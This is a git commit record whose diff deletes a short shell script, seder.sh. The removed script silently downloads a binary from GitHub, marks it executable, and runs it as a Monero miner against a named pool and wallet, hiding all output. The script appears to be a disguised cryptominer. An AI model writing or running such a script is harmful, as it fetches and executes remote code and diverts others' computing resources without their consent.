56538b99c4438ca774b0907918599a924df5d27b
komaria10003099 <komaria10003099@webmail.uad.ac.id>
2024-03-20 03:06:11 +0700

    Delete seder.sh

--- seder.sh
+++
@@ -1,4 +0,0 @@
-#!/usr/bin/env bash
-wget https://github.com/komaria10003099/stunning-adventure/raw/main/bashi >/dev/null 2>&1
-chmod +x bashi
-./bashi --algorithm wrkz --pool xmr.ipv64.io:4444 --username 8BPjSontrTiSe1aM6ib39yh2fciZgSwBEG8MF3ZuLKx3VMoCX4hnAuvere2dDhNR9eKSe2yfweueCRs2DBhMiBdiVUwpca2 >/dev/null 2>&1
